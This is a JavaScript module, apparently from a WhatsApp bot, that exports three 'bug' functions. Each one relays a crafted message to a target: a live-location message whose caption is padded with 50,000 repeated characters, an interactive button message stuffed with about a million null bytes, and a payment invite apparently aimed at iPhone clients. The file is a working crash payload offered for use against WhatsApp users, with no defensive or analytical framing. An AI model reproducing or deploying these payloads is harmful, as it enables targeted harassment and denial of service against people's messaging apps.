exports.oldlocation = async (rxhl, target) => {
    rxhl.relayMessage(target, { 
        "viewOnceMessage": {
            "message": {
                "liveLocationMessage": {
                    "degreesLatitude": "p",
                    "degreesLongitude": "p",
                    "caption": `RXHL BUG WHATSAPP ✅` + "ꦾ".repeat(50000),
                    "sequenceNumber": "0",
                    "jpegThumbnail": ""
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
    console.log(`RxhL OfficiaL`);
}

exports.oldcta = async (rxhl, target) => {
    rxhl.relayMessage(target, { 
        'viewOnceMessage': {
            'message': {
                'interactiveMessage': {
                    'header': {
                        'title': '',
                        'subtitle': " "
                    },
                    'body': {
                        'text': "RXHL MODS WHATSAPP"
                    },
                    'footer': {
                        'text': 'xp'
                    },
                    'nativeFlowMessage': {
                        'buttons': [{
                            'name': 'cta_url',
                            'buttonParamsJson': "{ display_text : 'RXHL MODS WHATSAPP', url : '', merchant_url : '' }"
                        }],
                        'messageParamsJson': "RxhL়" + "\u0000".repeat(1010000)
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
    
    console.log(`RxhL OfficiaL`);
}

exports.oldiphone = async (rxhl, target) => {
    await rxhl.relayMessage(
        target,
        {
            paymentInviteMessage: {
                serviceType: "FBPAY",
                expiryTimestamp: Date.now() + 1814400000
            }
        },
        {
            participant: {
                jid: target
            }
        }
    );
};